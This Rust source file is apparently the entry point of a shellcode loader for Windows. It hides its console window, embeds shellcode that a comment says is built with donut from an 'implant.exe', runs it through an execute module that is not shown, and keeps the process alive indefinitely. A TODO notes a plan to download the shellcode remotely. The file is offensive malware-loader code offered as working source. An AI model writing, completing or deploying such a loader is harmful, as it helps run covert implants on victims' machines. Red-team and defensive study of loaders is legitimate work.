// Don't flash up the console window when this code runs
#![windows_subsystem = "windows"]

use std::time::Duration;
mod execute;

fn main() {
    // Generate the shellcode with `donut implant.exe`
    // TODO: Actually download the shellcode instead of including it
    let mut shellcode = *include_bytes!("shellcode.bin");

    // Execute the shellcode, then sleep forever
    let handle = execute::exec(&mut shellcode).unwrap();
    if !handle.is_invalid() {
        loop {
            std::thread::sleep(Duration::MAX);
        }
    }
}
